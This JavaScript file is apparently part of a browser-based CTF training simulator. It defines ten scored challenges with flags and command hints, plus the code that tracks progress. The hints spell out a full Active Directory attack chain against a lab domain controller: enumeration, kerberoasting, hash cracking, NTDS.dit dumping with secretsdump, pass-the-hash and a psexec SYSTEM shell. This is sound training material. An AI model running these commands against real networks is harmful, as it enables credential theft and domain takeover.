'use strict';

const CTF_CHALLENGES = [
  {
    id: 1, title: 'Port Scan the DC', pts: 100,
    flag: 'FLAG{dc01_discovered_ports_445_88_389}',
    hint: 'nmap -sV -sC -p- 10.10.10.10',
    done: false,
    check: r => r.id === 'nmap-full',
  },
  {
    id: 2, title: 'SMB Enumeration', pts: 100,
    flag: 'FLAG{corp_local_domain_enumerated}',
    hint: 'enum4linux -a 10.10.10.10',
    done: false,
    check: r => r.id === 'enum4linux',
  },
  {
    id: 3, title: 'Validate Credentials', pts: 150,
    flag: 'FLAG{john_doe_authenticated_smb}',
    hint: "crackmapexec smb 10.10.10.10 -u john.doe -p 'Password1!'",
    done: false,
    check: r => r.id === 'cme-johndoe',
  },
  {
    id: 4, title: 'Find SPNs', pts: 200,
    flag: 'FLAG{3_spns_found_svc_backup_svc_sql_svc_web}',
    hint: "impacket-GetUserSPNs CORP.LOCAL/john.doe:'Password1!' -dc-ip 10.10.10.10",
    done: false,
    check: r => r.id === 'spns-enum',
  },
  {
    id: 5, title: 'Request TGS Tickets', pts: 250,
    flag: 'FLAG{tgs_tickets_captured_rc4_etype23}',
    hint: 'Add -request -outputfile hashes.kerberoast to GetUserSPNs',
    done: false,
    check: r => r.id === 'spns-request',
  },
  {
    id: 6, title: 'Crack TGS Hashes', pts: 300,
    flag: 'FLAG{svc_backup_cracked_Backup2023}',
    hint: 'john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt',
    done: false,
    check: r => r.id === 'john-crack' || r.id === 'hashcat',
  },
  {
    id: 7, title: 'Validate svc_backup', pts: 200,
    flag: 'FLAG{svc_backup_backup_operators_group}',
    hint: "crackmapexec smb 10.10.10.10 -u svc_backup -p 'Backup2023!'",
    done: false,
    check: r => r.id === 'cme-svcbackup',
  },
  {
    id: 8, title: 'Dump NTDS.dit', pts: 400,
    flag: 'FLAG{ntds_dumped_all_domain_hashes}',
    hint: "impacket-secretsdump CORP.LOCAL/svc_backup:'Backup2023!'@10.10.10.10",
    done: false,
    check: r => r.id === 'secretsdump',
  },
  {
    id: 9, title: 'Pass-the-Hash', pts: 350,
    flag: 'FLAG{administrator_pth_pwn3d}',
    hint: 'crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889',
    done: false,
    check: r => r.id === 'cme-pth',
  },
  {
    id: 10, title: 'SYSTEM Shell', pts: 500,
    flag: 'FLAG{dc01_compromised_nt_authority_system}',
    hint: 'impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 CORP.LOCAL/Administrator@10.10.10.10',
    done: false,
    check: r => r.id === 'psexec',
  },
];

const CTF = {
  challenges: CTF_CHALLENGES,

  _loadState() {
    try {
      const s = JSON.parse(localStorage.getItem('ctf_state') || '{}');
      this.challenges.forEach(c => { if (s[c.id]) c.done = true; });
    } catch {}
  },

  _saveState() {
    const s = {};
    this.challenges.forEach(c => { if (c.done) s[c.id] = true; });
    localStorage.setItem('ctf_state', JSON.stringify(s));
  },

  score() { return this.challenges.filter(c => c.done).reduce((a, c) => a + c.pts, 0); },
  maxScore() { return this.challenges.reduce((a, c) => a + c.pts, 0); },
  doneCount() { return this.challenges.filter(c => c.done).length; },

  check(result) {
    if (!result || !result.id) return null;
    for (const c of this.challenges) {
      if (!c.done && c.check(result)) {
        c.done = true;
        this._saveState();
        return c;
      }
    }
    return null;
  },

  reset() {
    this.challenges.forEach(c => c.done = false);
    localStorage.removeItem('ctf_state');
    SIM.hashesOnDisk = false;
    SIM.windowsShell = false;
    SIM.user = 'kali';
    SIM.cwd  = '/home/kali';
    TERM_INSTANCES.forEach(t => t._updatePrompt());
    this._renderSidebar();
  },

  // ── Sidebar UI ────────────────────────────────────────────────────────────
  _renderSidebar() {
    const list = document.getElementById('ctf-list');
    const scoreEl = document.getElementById('ctf-score');
    const barEl = document.getElementById('ctf-bar');
    const progEl = document.getElementById('ctf-progress-label');
    if (!list) return;

    scoreEl.textContent = this.score().toLocaleString();
    const pct = Math.round(this.score() / this.maxScore() * 100);
    barEl.style.width = pct + '%';
    progEl.textContent = `${this.doneCount()} / ${this.challenges.length} completed`;

    list.innerHTML = this.challenges.map((c, i) => `
      <div class="ctf-item${c.done ? ' done' : ''}">
        <div class="ctf-item-header">
          <div class="ctf-num">${c.done ? '✓' : c.id}</div>
          <div class="ctf-title">${c.title}</div>
          <div class="ctf-pts">${c.pts}pts</div>
        </div>
        ${c.done
          ? `<div class="ctf-flag">${c.flag}</div>`
          : `<div class="ctf-hint">${c.hint}</div>`}
      </div>`
    ).join('');
  },

  showFlagPopup(challenge) {
    document.getElementById('fp-challenge').textContent = challenge.title;
    document.getElementById('fp-flag').textContent = challenge.flag;
    document.getElementById('fp-pts').textContent = `+${challenge.pts} points`;
    document.getElementById('flag-popup').classList.remove('hidden');

    clearTimeout(this._popupTimer);
    this._popupTimer = setTimeout(() => {
      document.getElementById('flag-popup').classList.add('hidden');
    }, 9000);
  },

  init() {
    this._loadState();
    this._renderSidebar();

    document.getElementById('ctf-reset-btn').addEventListener('click', () => {
      if (confirm('Reset all CTF progress?')) this.reset();
    });
  },
};
